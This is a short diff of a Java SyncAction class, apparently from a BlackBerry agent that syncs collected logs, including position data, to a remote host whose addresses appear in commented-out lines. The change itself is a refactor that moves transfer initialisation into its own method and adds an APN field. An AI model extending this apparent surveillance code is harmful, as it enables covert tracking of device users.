@@ -9,6 +9,7 @@
 package blackberry.action;
 
 import java.io.EOFException;
+import java.util.Vector;
 
 import net.rim.device.api.util.DataBuffer;
 import blackberry.AgentManager;
@@ -38,6 +39,7 @@ public class SyncAction extends SubAction {
     protected boolean wifiForced;
     protected boolean wifi;
     protected boolean gprs;
+    protected Vector apns;
 
     boolean ssl = false;
 
@@ -121,7 +123,8 @@ public class SyncAction extends SubAction {
             //host = "192.168.1.177";
             //host = "89.96.137.6";
             //host = "iperbole.suppose.it"; port = 8080;
-            transfer.init(host, port, ssl, wifiForced, wifi, gprs);
+
+            transferInit();
 
             // Stop degli agenti che producono un singolo log
             agentManager.reStart(Agent.AGENT_POSITION);
@@ -154,16 +157,15 @@ public class SyncAction extends SubAction {
         } finally {
             synchronized (this) {
                 syncying = false;
-
             }
         }
     }
 
-    private Object getApn() {
-        // TODO Auto-generated method stub
-        return null;
+    protected void transferInit() {
+        transfer.init(host, port, ssl, wifiForced, wifi, gprs);
+             
     }
-
+    
     /*
      * (non-Javadoc)
      * @see blackberry.action.SubAction#parse(byte[])
